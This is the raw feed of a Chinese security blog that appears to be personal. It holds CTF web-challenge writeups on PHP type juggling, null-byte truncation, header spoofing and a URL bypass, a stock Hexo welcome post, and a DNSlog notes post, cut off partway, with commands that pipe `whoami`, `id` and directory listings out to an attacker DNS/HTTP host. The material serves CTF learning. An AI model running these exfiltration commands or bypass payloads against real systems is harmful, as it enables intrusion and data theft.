href="http://ctf5.shiyanbar.com/10/upload/" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/upload/</a></p></blockquote><p>这题主要是要注意源代码中<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"admin"</span> <span class="attr">content</span>=<span class="string">"admin@simplexue.com"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"editor"</span> <span class="attr">content</span>=<span class="string">"Vim"</span> /&gt;</span></div></pre></td></tr></table></figure></p><p>其中包含了两个要素 第一个点为管理员的邮箱 第二个则提醒了是用vim编辑器编辑的（没注意，看了writeup才知道）<br>vim编辑器在编辑时会有一个临时文件 例 <code>submit.php</code>则有<code>.submit.php.swp</code>，于是访问得<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">........这一行是省略的代码........ </div><div class="line">/* 如果登录邮箱地址不是管理员则 die() 数据库结构 -- </div><div class="line">CREATE TABLE IF NOT EXISTS `user` (</div><div class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</div><div class="line">  `username` varchar(255) NOT NULL,</div><div class="line">  `email` varchar(255) NOT NULL,</div><div class="line">  `token` int(255) NOT NULL DEFAULT &apos;0&apos;,</div><div class="line">  PRIMARY KEY (`id`)</div><div class="line">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</div><div class="line"></div><div class="line">-- -- 转存表中的数据 `user` -- </div><div class="line">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES (1, &apos;****不可见***&apos;, &apos;***不可见***&apos;, 0); </div><div class="line"></div><div class="line">*/ ........这一行是省略的代码........ </div><div class="line">if(!empty($token)&amp;&amp;!empty($emailAddress))&#123;</div><div class="line">if(strlen($token)!=10) die(&apos;fail&apos;);</div><div class="line">if($token!=&apos;0&apos;) die(&apos;fail&apos;);</div><div class="line">$sql = &quot;SELECT count(*) as num from `user` where token=&apos;$token&apos; AND email=&apos;$emailAddress&apos;&quot;;</div><div class="line">$r = mysql_query($sql) or die(&apos;db error&apos;);</div><div class="line">$r = mysql_fetch_assoc($r);</div><div class="line">$r = $r[&apos;num&apos;];</div><div class="line">if($r&gt;0)&#123;</div><div class="line">echo $flag;</div><div class="line">&#125;else&#123;</div><div class="line">echo &quot;失败了呀&quot;;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>判断token为10位且为0，又见数据库中该字段default为0，那么提交十位且为0的值就ok了<br>提交<code>0e1111111</code>，得到flag</p><h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><blockquote><p>啊拉？又是php审计。已经想吐了。<br>hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/more.php</a></p></blockquote><p><code>ereg()</code>函数遇到<code>%00</code>会截断（<strong>在地址栏提交</strong>）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</div><div class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><ul><li>要求大小写字母和数字 –&gt; 前面字母后面用<code>%00</code>截断</li><li>大于9999999 –&gt; 1e8</li><li>包含<code>*-*</code></li></ul><p>于是地址栏提交，得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/web/more.php?password=1e8%00*-*</div></pre></td></tr></table></figure></p><h2 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h2><blockquote><p>天网你敢来挑战嘛<br>解题链接：<a href="http://ctf5.shiyanbar.com/10/web1/" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/web1/</a></p></blockquote><p>查看源代码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!-- $test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) --&gt;</div></pre></td></tr></table></figure></p><p>对提交的username加密，加密后和0做比较，于是提交<code>QNKCDZO</code>，该字符串加密后为<code>0e830400451993494058024219903391</code>与0做<code>==</code>比较会返回相等，页面出现<code>/user.php?fame=hjkleffifer</code>放入地址栏访问，得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$unserialize_str = $_POST[<span class="string">'password'</span>];</div><div class="line">$data_unserialize = unserialize($unserialize_str);</div><div class="line"><span class="keyword">if</span>($data_unserialize[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; $data_unserialize[<span class="string">'pass'</span>]==<span class="string">'???'</span>)</div><div class="line">&#123;</div><div class="line">   print_r($flag);</div><div class="line">&#125;</div><div class="line">伟大的科学家php方言道：成也布尔，败也布尔。</div><div class="line">回去吧骚年</div></pre></td></tr></table></figure><p>根据页面里的提示，很快想到让<code>$data_unserialize[&#39;user&#39;]</code>的值为<code>true</code>，与字符串比较还是为真，于是本地构造下序列化后的字符串为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a:2:&#123;s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;&#125;</div></pre></td></tr></table></figure></p><p>最后提交用户名为该序列化字符串，密码为<code>QNKCDZO</code>，得到flag</p><h2 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h2><blockquote><p>不多说，去看题目吧。<br>解题链接： <a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="external">http://ctf5.shiyanbar.com/phpaudit/</a></p></blockquote><p>有源码可以查看<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</div><div class="line">$cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</div><div class="line">$cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</div><div class="line">$cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</div><div class="line"><span class="keyword">else</span></div><div class="line">$cip = <span class="string">"0.0.0.0"</span>;</div><div class="line"><span class="keyword">return</span> $cip;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$GetIPs = GetIP();</div><div class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>简单伪造个<code>X-FORWARDED-FOR: 1.1.1.1</code>的IP访问得到flag</p><h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><blockquote><p>提示都这么多了，再提示就没意思了。<br>解题链接： <a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="external">http://ctf5.shiyanbar.com/sHeader/</a> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Forbidden</div><div class="line"> </div><div class="line"> </div><div class="line">You don&apos;t have permission to access / on this server.</div><div class="line"></div><div class="line">Please make sure you have installed .net framework 9.9!</div><div class="line"></div><div class="line">Make sure you are in the region of England and browsing this site with Internet Explorer</div></pre></td></tr></table></figure><p>根据提示，可以看出是要修改http header来达到那些条件，分别是</p><ul><li>安装.net framework 9.9!</li><li>England</li><li>IE浏览器访问 </li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 9.9)</div><div class="line"><span class="attribute">Accept-Language</span>: en-gb</div></pre></td></tr></table></figure><p>这个Accept-Language一开始用en试了好久，都不行，原来要用en-gb……</p><h2 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h2><blockquote><p>catch！catch！catch！嘿嘿，不多说了，再说剧透了<br>解题链接： <a href="http://ctf5.shiyanbar.com/basic/catch/" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/catch/</a> </p></blockquote><p>访问发现header里面有个<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Row:MTUwNzE3MDYxNA==</div></pre></td></tr></table></figure></p><p>不用解密直接提交得到flag……</p><h2 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h2><blockquote><p>如何欺骗服务器，才能拿到Flag？<br>解题链接： <a href="http://ctf5.shiyanbar.com/10/indirection/" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/indirection/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">// code by SEC@USTC </span></div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="charset" content="gbk"&gt;&lt;/head&gt;&lt;body&gt;'</span>; </div><div class="line"></div><div class="line">$URL = $_SERVER[<span class="string">'REQUEST_URI'</span>]; </div><div class="line"><span class="comment">//echo 'URL: '.$URL.'&lt;br/&gt;'; </span></div><div class="line">$flag = <span class="string">"CTF&#123;???&#125;"</span>; </div><div class="line"></div><div class="line">$code = str_replace($flag, <span class="string">'CTF&#123;???&#125;'</span>, file_get_contents(<span class="string">'./index.php'</span>)); </div><div class="line">$stop = <span class="number">0</span>; </div><div class="line"></div><div class="line"><span class="comment">//这道题目本身也有教学的目的 </span></div><div class="line"><span class="comment">//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的 </span></div><div class="line"><span class="comment">//所以，第一个要求就是不得出现 ./ </span></div><div class="line"><span class="keyword">if</span>($flag &amp;&amp; strpos($URL, <span class="string">'./'</span>) !== <span class="keyword">FALSE</span>)&#123; </div><div class="line">    $flag = <span class="string">""</span>; </div><div class="line">    $stop = <span class="number">1</span>;        <span class="comment">//Pass </span></div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">//第二，我们可以构造 \ 来代替被过滤的 / </span></div><div class="line"><span class="comment">//所以，第二个要求就是不得出现 ../ </span></div><div class="line"><span class="keyword">if</span>($flag &amp;&amp; strpos($URL, <span class="string">'\\'</span>) !== <span class="keyword">FALSE</span>)&#123; </div><div class="line">    $flag = <span class="string">""</span>; </div><div class="line">    $stop = <span class="number">2</span>;        <span class="comment">//Pass </span></div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">//第三，有的系统大小写通用，例如 indirectioN/ </span></div><div class="line"><span class="comment">//你也可以用?和#等等的字符绕过，这需要统一解决 </span></div><div class="line"><span class="comment">//所以，第三个要求对可以用的字符做了限制，a-z / 和 . </span></div><div class="line">$matches = <span class="keyword">array</span>(); </div><div class="line">preg_match(<span class="string">'/^([0-9a-z\/.]+)$/'</span>, $URL, $matches); </div><div class="line"><span class="keyword">if</span>($flag &amp;&amp; <span class="keyword">empty</span>($matches) || $matches[<span class="number">1</span>] != $URL)&#123; </div><div class="line">    $flag = <span class="string">""</span>; </div><div class="line">    $stop = <span class="number">3</span>;        <span class="comment">//Pass </span></div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">//第四，多个 / 也是可以的 </span></div><div class="line"><span class="comment">//所以，第四个要求是不得出现 // </span></div><div class="line"><span class="keyword">if</span>($flag &amp;&amp; strpos($URL, <span class="string">'//'</span>) !== <span class="keyword">FALSE</span>)&#123; </div><div class="line">    $flag = <span class="string">""</span>; </div><div class="line">    $stop = <span class="number">4</span>;        <span class="comment">//Pass </span></div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">//第五，显然加上index.php或者减去index.php都是可以的 </span></div><div class="line"><span class="comment">//所以我们下一个要求就是必须包含/index.php，并且以此结尾 </span></div><div class="line"><span class="keyword">if</span>($flag &amp;&amp; substr($URL, <span class="number">-10</span>) !== <span class="string">'/index.php'</span>)&#123; </div><div class="line">    $flag = <span class="string">""</span>; </div><div class="line">    $stop = <span class="number">5</span>;        <span class="comment">//Pass </span></div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">//第六，我们知道在index.php后面加.也是可以的 </span></div><div class="line"><span class="comment">//所以我们禁止p后面出现.这个符号 </span></div><div class="line"><span class="keyword">if</span>($flag &amp;&amp; strpos($URL, <span class="string">'p.'</span>) !== <span class="keyword">FALSE</span>)&#123; </div><div class="line">    $flag = <span class="string">""</span>; </div><div class="line">    $stop = <span class="number">6</span>;        <span class="comment">//Pass </span></div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="comment">//第七，现在是最关键的时刻 </span></div><div class="line"><span class="comment">//你的$URL必须与/indirection/index.php有所不同 </span></div><div class="line"><span class="keyword">if</span>($flag &amp;&amp; $URL == <span class="string">'/indirection/index.php'</span>)&#123; </div><div class="line">    $flag = <span class="string">""</span>; </div><div class="line">    $stop = <span class="number">7</span>;        <span class="comment">//Pass </span></div><div class="line">&#125; </div><div class="line"><span class="keyword">if</span>(!$stop) $stop = <span class="number">8</span>; </div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">'Flag: '</span>.$flag; </div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;hr /&gt;'</span>; </div><div class="line"><span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt; $stop; $i++) </div><div class="line">    $code = str_replace(<span class="string">'//Pass '</span>.$i, <span class="string">'//Pass'</span>, $code); </div><div class="line"><span class="keyword">for</span>(; $i &lt; <span class="number">8</span>; $i++) </div><div class="line">    $code = str_replace(<span class="string">'//Pass '</span>.$i, <span class="string">'//Not Pass'</span>, $code); </div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">echo</span> highlight_string($code, <span class="keyword">TRUE</span>); </div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;/body&gt;&lt;/html&gt;'</span>;</div></pre></td></tr></table></figure><p>这题在看了之后，我顺手输入了一个index.php 就直接把flag显示了？？不懂什么鬼，而后又查看了别人的writeup，貌似这题考的本意是利用伪静态技术，访问<code>/index.php/index.php</code>来达到绕过的目的</p><h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><blockquote><p>相信你一定能拿到想要的<br>Hint:你可能希望知道服务器端发生了什么。。<br>格式：CTF{}<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/kzhan.php</a></p></blockquote><p>尝试提交，发现返回header的cookie中有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Set-Cookie: sample-hash=571580b26c65f306376d4f64e53cb5c7;</div><div class="line">Set-Cookie: source=0;</div></pre></td></tr></table></figure></p><p>尝试把source的值修改为1，提交 显示了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</div><div class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></div><div class="line"></div><div class="line">$username = $_POST[<span class="string">"username"</span>];</div><div class="line">$password = $_POST[<span class="string">"password"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</div><div class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</div><div class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</div><div class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>尝试了好久绕过<code>!=</code>但是均不成功，后来查看writeup得知是要利用到<a href="http://www.freebuf.com/articles/database/137129.html" target="_blank" rel="external"><strong>hash拓展攻击</strong></a>的知识，不在这展开，后续深入拓展</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近想参加CTF的比赛，于是国庆放假做一下实验吧的web部分题目 并简单做个记录，并非完全是自己的writeup吧 和别人共同讨论吧！&lt;br&gt;
    
    </summary>
    
      <category term="writeup-web" scheme="https://isky0t.github.io/categories/writeup-web/"/>
    
    
      <category term="CTF" scheme="https://isky0t.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="https://isky0t.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://isky0t.github.io/2017/10/01/hello-world/"/>
    <id>https://isky0t.github.io/2017/10/01/hello-world/</id>
    <published>2017-10-01T12:18:46.000Z</published>
    <updated>2017-10-03T01:52:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.<br><a id="more"></a></p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;.&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DNSlog利用方法记录</title>
    <link href="https://isky0t.github.io/2017/08/09/DNSlog%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E8%AE%B0%E5%BD%95/"/>
    <id>https://isky0t.github.io/2017/08/09/DNSlog利用方法记录/</id>
    <published>2017-08-09T01:54:35.000Z</published>
    <updated>2017-10-13T02:09:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>从其他地方看到，转载并总结下，记录下来以后可能会用到<br><a id="more"></a></p><h2 id="DNSlog平台"><a href="#DNSlog平台" class="headerlink" title="DNSlog平台"></a>DNSlog平台</h2><p>CEYE：<a href="http://ceye.io/record/index" target="_blank" rel="external">http://ceye.io/record/index</a></p><p>土司：<a href="https://www.t00ls.net/dnslog.html" target="_blank" rel="external">https://www.t00ls.net/dnslog.html</a> （目前好像不能用)</p><h2 id="大概原理"><a href="#大概原理" class="headerlink" title="大概原理"></a>大概原理</h2><p>利用DNS解析的方法 从日志中提取关键解析请求 从而获取我们需要的数据</p><h2 id="终端下利用"><a href="#终端下利用" class="headerlink" title="终端下利用"></a>终端下利用</h2><p><strong>Linux</strong><br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">ping</span> -c <span class="number">1</span> `whoami`.xxx.dnslog.link</div><div class="line"> </div><div class="line">如果碰到内容有空格（换行符等），就会截断，只输出前面的，这时候可以利用编码来输出，但有输出字符数最大限制；</div><div class="line">curl http://xxx.dnslog.link/$(id|base64)</div><div class="line"> </div><div class="line">碰到ls这类多个输出的命令，直接使用脚本；</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(ls /);<span class="keyword">do</span> curl "http://$i.xxx.dnslog.link/";done;</div></pre></td></tr></table></figure></p><p><strong>Windows</strong><br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">利用HTTP请求：</div><div class="line"><span class="keyword">for</span> /F %x <span class="keyword">in</span> ('whoami') <span class="keyword">do</span> <span class="built_in">start</span> http://xxx.dnslog.link/%x</div><div class="line">将结果使用默认浏览器弹出；</div><div class="line"> </div><div class="line">利用DNS请求：</div><div class="line">获取计算机名：<span class="keyword">for</span> /F "delims=\" %i <span class="keyword">in</span> ('whoami') <span class="keyword">do</span> 